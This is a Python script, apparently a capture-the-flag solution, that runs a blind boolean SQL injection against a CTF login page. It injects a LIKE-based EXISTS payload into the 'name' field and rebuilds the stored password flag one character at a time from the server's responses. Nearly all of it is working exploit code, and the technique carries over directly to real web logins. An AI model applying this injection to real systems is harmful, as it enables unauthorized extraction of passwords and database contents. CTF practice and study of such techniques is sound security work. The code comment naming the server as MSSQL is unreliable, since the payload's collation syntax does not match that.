import requests
import string
import re

sql_inject_begin = "' OR EXISTS(SELECT * FROM user WHERE pass LIKE  'FIT{%"

# Note the use of ESCAPE... This is a mssql server!
sql_inject_end = "%}' COLLATE utf8_bin ESCAPE '\\' ) --"

chars = string.printable
print chars

chars = list(chars)  # Need a list to properly escape special chars

for i in range(0, len(chars)):
    if(chars[i] is "\\"):
        chars[i] = r"\\"
    if(chars[i] is "\'"):
        chars[i] = r"\'"
    if(chars[i] is "\""):
        chars[i] = r"\""
    if(chars[i] is "_"):
        chars[i] = r"\_"
    if(chars[i] is "%"):
        chars[i] = r"\%"

final_chars = []

'''
# Find each character in password
for char in chars:
    final_sql_inject = sql_inject_begin + char + sql_inject_end
    r = requests.post("https://login.problem.ctf.nw.fit.ac.jp/login.php", data={'name': final_sql_inject})

    if(r.text.find("Password is a flag") != -1):
        print "This char is in password:" + char
        final_chars.append(char)'''

print str(final_chars)
# If chars are known, can be put below and above commented -- This list is missing symbols
final_chars = ['0', '1', '3', '8', '9', 'a', 'n', 'u', 'y', 'A', 'N', 'U', 'Y', r"\_"]

# If partial password known, password can be set to that. Else, set to first char
# This acts as a "continue" feature
password = final_chars[0]
found = True

# Test value
# r = "09anuyNU98310"  # TEST LINE

# While matches are made, continue adding chars to front and back of string
while found is True:
    found = False
    for i in final_chars:  # Add each possible character to front and back
        print "Testing: " + password + " with " + i

        # First, try adding this char front
        sql_inject = sql_inject_begin + i + password + sql_inject_end
        r = requests.post("https://login.problem.ctf.nw.fit.ac.jp/login.php", data={'name': sql_inject})
        if(r.text.find("Password is a flag") != -1):
            # test = i + password  # TEST LINE
            # if(r.find(test) != -1):  # TEST LINE
            print "Found substring: " + i + password
            password = i + password
            found = True

        # Now, try back
        sql_inject = sql_inject_begin + password + i + sql_inject_end
        r = requests.post("https://login.problem.ctf.nw.fit.ac.jp/login.php", data={'name': sql_inject})
        if(r.text.find("Password is a flag") != -1):
            # test = password + i  # TEST LINE
            # if(r.find(test) != -1):  # TEST LINE
            print "Found substring: " + password + i
            password = password + i
            found = True

# Done! Go ahead and print the long-awaited password
print 'FIT{' + password + '}'
